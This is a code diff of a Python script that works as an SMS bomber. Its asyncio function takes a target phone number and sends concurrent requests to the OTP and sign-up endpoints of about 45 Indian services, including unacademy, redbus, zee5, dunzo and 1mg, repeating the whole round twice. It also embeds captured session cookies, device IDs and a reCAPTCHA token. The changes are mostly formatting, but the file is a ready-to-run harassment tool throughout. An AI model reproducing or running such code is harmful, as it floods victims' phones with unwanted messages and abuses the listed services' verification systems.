@@ -2,31 +2,30 @@ import time
 import asyncio
 import aiohttp
 import requests
-start= time.time()
+
+
 
 async def indsms(tarnum: int):
-    
-    
-    async def whitehat(tarnum: int ):
+    async def whitehat(tarnum: int):
         try:
-            
+
             headers = {
-            'authority': 'api.whitehatjr.com',
-            'accept': 'application/json, text/plain, */*',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/json;charset=UTF-8',
-            'origin': 'https://code.whitehatjr.com',
-            'referer': 'https://code.whitehatjr.com/',
-            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
-            'whjr-amplitude-sessionid': '1688803790709',
-            'whjr-segment-anonymousid': 'ce603231-2d29-46c1-82d4-70b1a0a20494',
-                }
+                'authority': 'api.whitehatjr.com',
+                'accept': 'application/json, text/plain, */*',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/json;charset=UTF-8',
+                'origin': 'https://code.whitehatjr.com',
+                'referer': 'https://code.whitehatjr.com/',
+                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-site',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+                'whjr-amplitude-sessionid': '1688803790709',
+                'whjr-segment-anonymousid': 'ce603231-2d29-46c1-82d4-70b1a0a20494',
+            }
 
             params = {
                 'deviceId': 'b2477942-81e6-47ba-921d-7d2673862942',
@@ -37,26 +36,27 @@ async def indsms(tarnum: int):
                 'brandId': 'whitehatjr',
                 'timestamp': '1688803828654',
                 '_vercel_no_cache': '1',
-                    }
+            }
 
             json_data = {
                 'dialCode': '+91',
                 'mobile': f'{tarnum}',
                 'g-recaptcha-response': '03AAYGu2RQ3WrKIPmFVc_CZyy2gqAgKAc5h3YubYhzlr_VXjKpWjnIlEZ2ij1SZ68Hx6JOP1waWARsDHRJ0PVUpYJUAhmEZXgcRLQMY57DQkzDgez8PQ8P2Ia4Vc47q-AMqVUS2eWLwzuNos8JBUUP0RFC87m3d2ROeViR6IsseygK5ft-w5q-WtUkqUvYywwHtCmApTTmdBMgVbsbTpnX5cRkRSriW3yqG7heX2S2TiPsF377BAL5UGUQmjP93CwUdn8Bf2hhXq60xP77LXoVEvAsOZKxUDmVbf5DqXkWU8w_cSS_ZiIpRjw2xKzRUAj_GZB0s03ZPrewTzbGc3JtY7BKd6TtqNmcQ6CiadK0relg-ccZsLjiIe85KSoFBZfSH9ZeL3PECO3d4GLwHQjxwUNpeF_DB0rFMmT2nWSoyh0RnBGQpF5JkZfzEHuRDEN7jOS1xS_TpmidLkBZP18UWGZNN_tBl0_8nwFpe08uFQ6cqxyvM92sCEyZCoY13a4ZamoRSPBBam3ZK5KPmX_sUhROXrNql_PK6lJd_xA1JAJij7yKP-wYQWKFanKM8dUeldLxyAMg2RhQ',
-                    }
+            }
             async with aiohttp.ClientSession() as sess:
-                async with sess.post('https://api.whitehatjr.com/api/V1/otp/generate', params=params, headers=headers, json=json_data) as response:
+                async with sess.post('https://api.whitehatjr.com/api/V1/otp/generate', params=params, headers=headers,
+                                     json=json_data) as response:
                     print(response.text)
-             
+
             return "done"
         except Exception as e:
             return "failed"
-    
-    async def unacademy(tarnum: int ):
+
+    async def unacademy(tarnum: int):
         try:
             params = {
                 'enable-email': 'true',
-                    }
+            }
 
             json_data = {
                 'phone': f'{tarnum}',
@@ -65,18 +65,19 @@ async def indsms(tarnum: int):
                 'email': '',
                 'send_otp': True,
                 'is_un_teach_user': False,
-                    }
+            }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post(
-                'https://unacademy.com/api/v3/user/user_check/',
-                params=params,
-                json=json_data,
-                    ) as response:
+                        'https://unacademy.com/api/v3/user/user_check/',
+                        params=params,
+                        json=json_data,
+                ) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-    async def apollo247(tarnum: int ):
+
+    async def apollo247(tarnum: int):
         try:
             headers = {
                 'authority': 'api.apollo247.com',
@@ -111,9 +112,9 @@ async def indsms(tarnum: int):
                     print(response.text)
             return "done"
         except Exception as e:
-            return "failed"  
+            return "failed"
 
-    async def mg1(tarnum: int ):
+    async def mg1(tarnum: int):
         try:
             json_data = {
                 'number': f'{tarnum}',
@@ -122,28 +123,27 @@ async def indsms(tarnum: int):
             }
             async with aiohttp.ClientSession() as sess:
 
-                async with sess.post('https://www.1mg.com/auth_api/v6/create_token',json=json_data) as response:
-
+                async with sess.post('https://www.1mg.com/auth_api/v6/create_token', json=json_data) as response:
                     print(response.text)
             return "done"
         except Exception as e:
-            return "failed" 
+            return "failed"
 
-    async def textbook(tarnum: int ):
+    async def textbook(tarnum: int):
         try:
             json_data = {}
             async with aiohttp.ClientSession() as sess:
 
                 async with sess.post(
-                f'https://api.testbook.com/api/v2/otp/send?emailOrMobile={tarnum}&resend=true',
-                json=json_data,
-            ) as response:
-            
+                        f'https://api.testbook.com/api/v2/otp/send?emailOrMobile={tarnum}&resend=true',
+                        json=json_data,
+                ) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-    async def tendercut(tarnum: int ):
+
+    async def tendercut(tarnum: int):
         try:
 
             json_data = {
@@ -157,7 +157,8 @@ async def indsms(tarnum: int):
             return "done"
         except Exception as e:
             return "failed"
-    async def croma(tarnum: int ):
+
+    async def croma(tarnum: int):
         try:
             headers = {
                 'authority': 'api.tatadigital.com',
@@ -183,27 +184,28 @@ async def indsms(tarnum: int):
                 'phone': f'{tarnum}',
             }
             async with aiohttp.ClientSession() as sess:
-                async with sess.post('https://api.tatadigital.com/api/v2/sso/check-phone', headers=headers, json=json_data) as response:
-                    print(response.text) 
+                async with sess.post('https://api.tatadigital.com/api/v2/sso/check-phone', headers=headers,
+                                     json=json_data) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-        
-    async def skecher(tarnum: int ):
+
+    async def skecher(tarnum: int):
         try:
             data = f'dwfrm_profile_customer_phone={tarnum}&phoneLogin=true'.encode()
             async with aiohttp.ClientSession() as sess:
 
                 async with sess.post(
-                'https://www.skechers.in/on/demandware.store/Sites-skechersin-Site/default/Account-GenerateOTP',
-                data=data,
-            ) as response:
+                        'https://www.skechers.in/on/demandware.store/Sites-skechersin-Site/default/Account-GenerateOTP',
+                        data=data,
+                ) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-    
-    async def dentalcart(tarnum: int ):
+
+    async def dentalcart(tarnum: int):
         try:
             json_data = {
                 'operationName': 'createAccountOTP',
@@ -219,7 +221,8 @@ async def indsms(tarnum: int):
             return "done"
         except Exception as e:
             return "failed"
-    async def lybra(tarnum: int ):
+
+    async def lybra(tarnum: int):
         try:
             cookies = {
                 'suid': '32d9eae9-15a8-416c-a213-ecd85c73aac2',
@@ -249,12 +252,14 @@ async def indsms(tarnum: int):
                 'email': 'jnjfdd@gmail.com',
             }
             async with aiohttp.ClientSession() as sess:
-                async with sess.post('https://www.lybrate.com/p/login-signup', cookies=cookies,json=json_data)as response:
+                async with sess.post('https://www.lybrate.com/p/login-signup', cookies=cookies,
+                                     json=json_data) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-    async def decathon(tarnum: int ):
+
+    async def decathon(tarnum: int):
         try:
             json_data = {
                 'param': f'{tarnum}',
@@ -266,8 +271,8 @@ async def indsms(tarnum: int):
             return "done"
         except Exception as e:
             return "failed"
-    
-    async def trainman(tarnum: int ):
+
+    async def trainman(tarnum: int):
         try:
             headers = {
                 'authority': 'www.trainman.in',
@@ -293,13 +298,14 @@ async def indsms(tarnum: int):
 
             data = f'------WebKitFormBoundarym9QS2xBGu82M0ZOU\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{tarnum}\r\n------WebKitFormBoundarym9QS2xBGu82M0ZOU\r\nContent-Disposition: form-data; name="email"\r\n\r\n\r\n------WebKitFormBoundarym9QS2xBGu82M0ZOU\r\nContent-Disposition: form-data; name="name"\r\n\r\n\r\n------WebKitFormBoundarym9QS2xBGu82M0ZOU--\r\n'.encode()
             async with aiohttp.ClientSession() as sess:
-                async with sess.post('https://www.trainman.in/services/user/signup', params=params,headers=headers, data=data) as response:
+                async with sess.post('https://www.trainman.in/services/user/signup', params=params, headers=headers,
+                                     data=data) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-        
-    async def redbus(tarnum: int ):
+
+    async def redbus(tarnum: int):
         try:
             json_data = {
                 'mobileNo': f'{tarnum}',
@@ -307,25 +313,25 @@ async def indsms(tarnum: int):
             }
             async with aiohttp.ClientSession() as sess:
 
-                async with sess.post('https://www.redbus.in/help/api/cx/generateOtp',json=json_data) as response:
+                async with sess.post('https://www.redbus.in/help/api/cx/generateOtp', json=json_data) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
 
-    async def confirm(tarnum: int ):
+    async def confirm(tarnum: int):
         try:
             async with aiohttp.ClientSession() as sess:
 
                 async with sess.get(
-                f'https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={tarnum}&newOtp=true&retry=false&testparamsp=true'
+                        f'https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={tarnum}&newOtp=true&retry=false&testparamsp=true'
                 ) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-        
-    async def physics(tarnum: int ):
+
+    async def physics(tarnum: int):
         try:
             params = {
                 'smsType': '0',
@@ -336,26 +342,28 @@ async def indsms(tarnum: int):
                 'organizationId': '5eb393ee95fab7468a79d189',
             }
             async with aiohttp.ClientSession() as sess:
-                async with sess.post('https://api.penpencil.co/v1/users/resend-otp', params=params,json=json_data) as response:
+                async with sess.post('https://api.penpencil.co/v1/users/resend-otp', params=params,
+                                     json=json_data) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-        
-    async def upgrade(tarnum: int ):
+
+    async def upgrade(tarnum: int):
         try:
             json_data = {
                 'phoneNumber': f'+91{tarnum}',
             }
             async with aiohttp.ClientSession() as sess:
 
-                async with sess.post('https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone', json=json_data) as response:
+                async with sess.post('https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone',
+                                     json=json_data) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-        
-    async def vedantu(tarnum: int ):
+
+    async def vedantu(tarnum: int):
         try:
             json_data = {
                 'email': None,
@@ -371,8 +379,8 @@ async def indsms(tarnum: int):
             return "done"
         except Exception as e:
             return "failed"
-        
-    async def doubtnut(tarnum: int ):
+
+    async def doubtnut(tarnum: int):
         try:
             headers = {
                 'authority': 'api.doubtnut.com',
@@ -393,13 +401,14 @@ async def indsms(tarnum: int):
 
             data = f'phone_number={tarnum}&is_web=3'.encode()
             async with aiohttp.ClientSession() as sess:
-                async with sess.post('https://api.doubtnut.com/v4/student/login', headers=headers, data=data) as response:
+                async with sess.post('https://api.doubtnut.com/v4/student/login', headers=headers,
+                                     data=data) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-        
-    async def zee5(tarnum: int ):
+
+    async def zee5(tarnum: int):
         try:
             headers = {
                 'Accept': 'application/json',
@@ -423,24 +432,26 @@ async def indsms(tarnum: int):
                 'phoneno': f'91{tarnum}',
             }
             async with aiohttp.ClientSession() as sess:
-                async with sess.post('https://auth.zee5.com/v1/user/sendotp', headers=headers, json=json_data) as response:
+                async with sess.post('https://auth.zee5.com/v1/user/sendotp', headers=headers,
+                                     json=json_data) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-        
-    async def ballebazi(tarnum: int ):
+
+    async def ballebazi(tarnum: int):
         try:
             json_data = {
                 'phone': f'{tarnum}',
             }
             async with aiohttp.ClientSession() as sess:
-                async with sess.post('https://bbapi.ballebaazi.com/users/applink',json=json_data) as response:
+                async with sess.post('https://bbapi.ballebaazi.com/users/applink', json=json_data) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-    async def byjus(tarnum: int ):
+
+    async def byjus(tarnum: int):
         try:
             json_data = {
                 'tel': f'+91{tarnum}',
@@ -448,13 +459,14 @@ async def indsms(tarnum: int):
             }
             async with aiohttp.ClientSession() as sess:
 
-                async with sess.post('https://webapi.byjusexamprep.com/user/verify/sendOtp', json=json_data) as response:
+                async with sess.post('https://webapi.byjusexamprep.com/user/verify/sendOtp',
+                                     json=json_data) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-        
-    async def dunzo(tarnum: int ):
+
+    async def dunzo(tarnum: int):
         try:
             cookies = {
                 'dz_e': 'YTAzOWIzNjMtNDU2MC00NDI1LWJjMjMtNDU5NTM4NTZkOGEwX3Yx',
@@ -497,25 +509,26 @@ async def indsms(tarnum: int):
                 'tos_accepted': True,
             }
             async with aiohttp.ClientSession() as sess:
-                async with sess.post('https://www.dunzo.com/api/v0/auth/sign-up', cookies=cookies, headers=headers, json=json_data) as response:
+                async with sess.post('https://www.dunzo.com/api/v0/auth/sign-up', cookies=cookies, headers=headers,
+                                     json=json_data) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-        
-    async def rapido(tarnum: int ):
+
+    async def rapido(tarnum: int):
         try:
             json_data = {
                 'mobile': f'{tarnum}',
             }
             async with aiohttp.ClientSession() as sess:
-                async with sess.post('https://customer.rapido.bike/api/otp',json=json_data) as response:
+                async with sess.post('https://customer.rapido.bike/api/otp', json=json_data) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-    
-    async def gopaysense(tarnum: int ):
+
+    async def gopaysense(tarnum: int):
         try:
             headers = {
                 'authority': 'api.gopaysense.com',
@@ -538,13 +551,14 @@ async def indsms(tarnum: int):
             }
             async with aiohttp.ClientSession() as sess:
 
-                async with sess.post('https://api.gopaysense.com/users/otp', headers=headers, json=json_data) as response:
+                async with sess.post('https://api.gopaysense.com/users/otp', headers=headers,
+                                     json=json_data) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-        
-    async def medibuddy(tarnum: int ):
+
+    async def medibuddy(tarnum: int):
         try:
             json_data = {
                 'source': 'medibuddy',
@@ -556,13 +570,14 @@ async def indsms(tarnum: int):
             }
             async with aiohttp.ClientSession() as sess:
 
-                async with sess.post('https://www.medibuddy.in/unified-login/user/register', json=json_data) as response:
+                async with sess.post('https://www.medibuddy.in/unified-login/user/register',
+                                     json=json_data) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-        
-    async def moglix(tarnum: int ):
+
+    async def moglix(tarnum: int):
         try:
             json_data = {
                 'phone': f'{tarnum}',
@@ -578,7 +593,7 @@ async def indsms(tarnum: int):
             return "done"
         except Exception as e:
             return "failed"
-        
+
     async def Xtracover(tarnum: int):
         try:
             data = {
@@ -591,7 +606,7 @@ async def indsms(tarnum: int):
             return "done"
         except Exception as e:
             return "failed"
-        
+
     async def mgy(tarnum: int):
         try:
             params = {
@@ -615,7 +630,7 @@ async def indsms(tarnum: int):
             return "done"
         except Exception as e:
             return "failed"
-        
+
     async def flyphone(tarnum: int):
         try:
             cookies = {
@@ -652,16 +667,16 @@ async def indsms(tarnum: int):
             }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post(
-                'https://www.flyphones.in/functions/market/ajxgrocpharmaction.php',
-                cookies=cookies,
-                headers=headers,
-                data=data,
+                        'https://www.flyphones.in/functions/market/ajxgrocpharmaction.php',
+                        cookies=cookies,
+                        headers=headers,
+                        data=data,
                 ) as response:
                     print(response.text)
                 return "done"
         except Exception as e:
             return "failed"
-        
+
     async def tyre(tarnum: int):
         try:
             data = {
@@ -675,9 +690,7 @@ async def indsms(tarnum: int):
 
                 return "done"
         except Exception as e:
-            return "failed"  
-
-
+            return "failed"
 
     async def winni(tarnum: int):
         try:
@@ -694,7 +707,7 @@ async def indsms(tarnum: int):
             return "done"
         except Exception as e:
             return "failed"
-    
+
     async def mrbrown(tarnum: int):
         try:
             cookies = {
@@ -735,12 +748,13 @@ async def indsms(tarnum: int):
                 'mobile': f'{tarnum}',
             }
             async with aiohttp.ClientSession() as sess:
-                async with sess.post('https://mrbrownbakery.com/customer/loginmobile', cookies=cookies, headers=headers, data=data)as response:
+                async with sess.post('https://mrbrownbakery.com/customer/loginmobile', cookies=cookies, headers=headers,
+                                     data=data) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-        
+
     async def moho(tarnum: int):
         try:
             headers = {
@@ -768,7 +782,7 @@ async def indsms(tarnum: int):
             return "done"
         except Exception as e:
             return "failed"
-        
+
     async def spinny(tarnum: int):
         try:
             json_data = {
@@ -782,21 +796,19 @@ async def indsms(tarnum: int):
             return "done"
         except Exception as e:
             return "failed"
-        
 
     async def carandbike(tarnum: int):
         try:
             data = f'------WebKitFormBoundaryDr402tofMftiZ625\r\nContent-Disposition: form-data; name="LeadForm[mobile]"\r\n\r\n{tarnum}\r\n------WebKitFormBoundaryDr402tofMftiZ625\r\nContent-Disposition: form-data; name="LeadForm[step]"\r\n\r\n1\r\n------WebKitFormBoundaryDr402tofMftiZ625\r\nContent-Disposition: form-data; name="LeadForm[id_form_type]"\r\n\r\n35\r\n------WebKitFormBoundaryDr402tofMftiZ625\r\nContent-Disposition: form-data; name="LeadForm[id_source]"\r\n\r\n1\r\n------WebKitFormBoundaryDr402tofMftiZ625\r\nContent-Disposition: form-data; name="LeadForm[id_city]"\r\n\r\n1186\r\n------WebKitFormBoundaryDr402tofMftiZ625\r\nContent-Disposition: form-data; name="LeadForm[id_classified]"\r\n\r\n95168\r\n------WebKitFormBoundaryDr402tofMftiZ625--\r\n'
             async with aiohttp.ClientSession() as sess:
                 async with sess.post(
-                'https://www.carandbike.com/api/user/register/submit-lead-form',
-                data=data,
-            ) as response:
+                        'https://www.carandbike.com/api/user/register/submit-lead-form',
+                        data=data,
+                ) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-        
 
     async def goibobo(tarnum: int):
         try:
@@ -829,15 +841,15 @@ async def indsms(tarnum: int):
             }
             async with aiohttp.ClientSession() as sess:
                 async with sess.post(
-                'https://userservice.goibibo.com/ext/web/desktop/send/token/OTP_IS_REG',
-                headers=headers,
-                json=json_data,
-            ) as response:
+                        'https://userservice.goibibo.com/ext/web/desktop/send/token/OTP_IS_REG',
+                        headers=headers,
+                        json=json_data,
+                ) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-        
+
     async def tradeindia(tarnum: int):
         try:
             cookies = {
@@ -870,12 +882,13 @@ async def indsms(tarnum: int):
 
             data = f'------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="country_code"\r\n\r\n+91\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{tarnum}\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="whatsapp_update"\r\n\r\ntrue\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="name"\r\n\r\nbhdfhbdhf\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="email"\r\n\r\njhsbbhsjd@gmail.com\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="terms"\r\n\r\ntrue\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="co_name"\r\n\r\nbddfdbg\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="pin_code"\r\n\r\n110092\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="state"\r\n\r\n\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="alpha_country_code"\r\n\r\n\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="city"\r\n\r\n\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="city_id"\r\n\r\n\r\n------WebKitFormBoundarye7QBnwbszSvb19CB--\r\n'
             async with aiohttp.ClientSession() as sess:
-                async with sess.post('https://api.tradeindia.com/home/registration/', cookies=cookies, headers=headers, data=data) as response:
+                async with sess.post('https://api.tradeindia.com/home/registration/', cookies=cookies, headers=headers,
+                                     data=data) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-        
+
     async def mobex(tarnumm: int):
         try:
             json_data = {
@@ -885,12 +898,12 @@ async def indsms(tarnum: int):
                 'query': 'mutation ($mobileNumber: String!) {\n  sendCodOtp(mobileNumber: $mobileNumber, websiteId: 1) {\n    message\n    status\n    __typename\n  }\n}',
             }
             async with aiohttp.ClientSession() as sess:
-                async with sess.post('https://www.mobex.in/graphql',json=json_data) as response:
+                async with sess.post('https://www.mobex.in/graphql', json=json_data) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-        
+
     async def bharatmetro(tarnum: int):
         try:
             data = {
@@ -904,7 +917,7 @@ async def indsms(tarnum: int):
             return "done"
         except Exception as e:
             return "failed"
-        
+
     async def medkart(tarnum: int):
         try:
             params = {
@@ -915,12 +928,13 @@ async def indsms(tarnum: int):
                 'mobile_no': f'{tarnum}',
             }
             async with aiohttp.ClientSession() as sess:
-                async with sess.post('https://app.medkart.in/api/v1/auth/requestOTP', params=params,json=json_data) as response:
+                async with sess.post('https://app.medkart.in/api/v1/auth/requestOTP', params=params,
+                                     json=json_data) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-        
+
     async def frankross(tarnum: int):
         try:
             json_data = {
@@ -930,12 +944,12 @@ async def indsms(tarnum: int):
                 },
             }
             async with aiohttp.ClientSession() as sess:
-                async with sess.post('https://crm.frankrosspharmacy.com/api/v8/user/otp_signin', json=json_data) as response:
+                async with sess.post('https://crm.frankrosspharmacy.com/api/v8/user/otp_signin',
+                                     json=json_data) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-        
 
     async def mamaearth(tarnum: int):
         try:
@@ -951,7 +965,6 @@ async def indsms(tarnum: int):
             return "done"
         except Exception as e:
             return "failed"
-        
 
     async def caratlane(tarnum: int):
         try:
@@ -1021,12 +1034,13 @@ async def indsms(tarnum: int):
                 'query': '\n        mutation {\n            SendOtp( \n                input: {\n        mobile: "9990000082",\n        isdCode: "91",\n        otpType: "registerOtp"\n      }\n            ) {\n                status {\n                    message\n                    code\n                }\n            }\n        }\n    ',
             }
             async with aiohttp.ClientSession() as sess:
-                async with sess.post('https://www.caratlane.com/cg/dhevudu', cookies=cookies, headers=headers, json=json_data) as response:
+                async with sess.post('https://www.caratlane.com/cg/dhevudu', cookies=cookies, headers=headers,
+                                     json=json_data) as response:
                     print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-        
+
     async def hometriangle(tarnum: int):
         try:
             json_data = {
@@ -1039,42 +1053,36 @@ async def indsms(tarnum: int):
         except Exception as e:
             return "failed"
 
-
-
-
-
-    
-    
     async def main(tarnum):
         print("here")
-        
-        for i in range (2):
+
+        for i in range(2):
             jh = await asyncio.gather(
-                whitehat(tarnum ),    
-                moglix(tarnum ),  
-                medibuddy(tarnum ),   
-                gopaysense(tarnum), 
-                rapido(tarnum), 
-                dunzo(tarnum),   
-                byjus(tarnum ),   
-                ballebazi(tarnum ),   
-                zee5(tarnum),    
-                doubtnut(tarnum),    
-                vedantu(tarnum), 
-                upgrade(tarnum), 
-                physics(tarnum), 
-                confirm(tarnum), 
-                redbus(tarnum) ,  
-                trainman(tarnum),    
-                decathon(tarnum),    
-                lybra(tarnum),   
-                dentalcart(tarnum),  
-                skecher(tarnum), 
-                croma(tarnum),   
-                tendercut(tarnum),   
-                textbook(tarnum),    
-                mg1(tarnum), 
-                apollo247(tarnum),   
+                whitehat(tarnum),
+                moglix(tarnum),
+                medibuddy(tarnum),
+                gopaysense(tarnum),
+                rapido(tarnum),
+                dunzo(tarnum),
+                byjus(tarnum),
+                ballebazi(tarnum),
+                zee5(tarnum),
+                doubtnut(tarnum),
+                vedantu(tarnum),
+                upgrade(tarnum),
+                physics(tarnum),
+                confirm(tarnum),
+                redbus(tarnum),
+                trainman(tarnum),
+                decathon(tarnum),
+                lybra(tarnum),
+                dentalcart(tarnum),
+                skecher(tarnum),
+                croma(tarnum),
+                tendercut(tarnum),
+                textbook(tarnum),
+                mg1(tarnum),
+                apollo247(tarnum),
                 unacademy(tarnum),
                 Xtracover(tarnum),
                 mgy(tarnum),
@@ -1082,7 +1090,7 @@ async def indsms(tarnum: int):
                 tyre(tarnum),
                 winni(tarnum),
                 mrbrown(tarnum),
-                #moho(tarnum),
+                # moho(tarnum),
                 spinny(tarnum),
                 # carandbike(tarnum),
                 goibobo(tarnum),
@@ -1095,9 +1103,9 @@ async def indsms(tarnum: int):
                 caratlane(tarnum),
                 hometriangle(tarnum)
 
-                )
+            )
             print(jh)
-    asyncio.run(main(tarnum))
-end = time.time()
-print(end-start)
+
+    await main(tarnum)
+
 
